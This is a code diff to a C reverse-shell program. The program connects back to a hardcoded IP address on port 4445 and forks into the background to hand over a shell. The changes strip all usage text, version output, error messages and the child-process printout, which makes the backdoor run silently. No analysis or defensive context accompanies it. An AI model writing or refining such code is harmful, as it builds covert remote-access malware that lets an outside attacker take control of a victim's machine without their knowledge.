@@ -1,4 +1,3 @@
-#include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <netdb.h>
@@ -27,22 +26,6 @@ struct rshell
 };
 
 
-static void usage()
-{
-	fprintf(stderr, "usage: %s [options] <host> <port>\n", PROGNAME);
-	fprintf(stderr, "options:\n");
-	fprintf(stderr, "\t-h         : display this and exit\n");
-	fprintf(stderr, "\t-v         : display version and exit\n");
-	fprintf(stderr, "\t-f         : foreground mode (eg: no fork)\n");
-	fprintf(stderr, "\t-6         : use IPv6 socket\n");
-	fprintf(stderr, "\t-s <shell> : give the path shell (default: %s)\n", PATHSHELL);
-}
-
-
-static void version()
-{
-	fprintf(stderr, "%s %s\n", PROGNAME, VERSION);
-}
 
 
 static char *rshell_basename(char *path)
@@ -143,7 +126,6 @@ int main(int argc, char *argv[])
 			break;
 
 			case 'h':
-			usage();
 			return 0;
 
 			case 's':
@@ -151,7 +133,6 @@ int main(int argc, char *argv[])
 			break;
 
 			case 'v':
-			version();
 			return 0;
 		}
 	}
@@ -162,7 +143,6 @@ int main(int argc, char *argv[])
 	rshell.host = "107.170.200.75";
 	if ( rshell_set_port(&rshell, "4445") )
 	{
-		fprintf(stderr, "Invalid port %s\n", "4445");
 		return -1;
 	}
 
@@ -170,8 +150,6 @@ int main(int argc, char *argv[])
 	 */
 	if ( (rshell.flags & RSHELL_F_NOFORK) || (child = fork()) == 0 )
 		reverse_tcp(&rshell);
-	else
-		printf("child pid: %d\n", child);
 
 	return 0;
 }
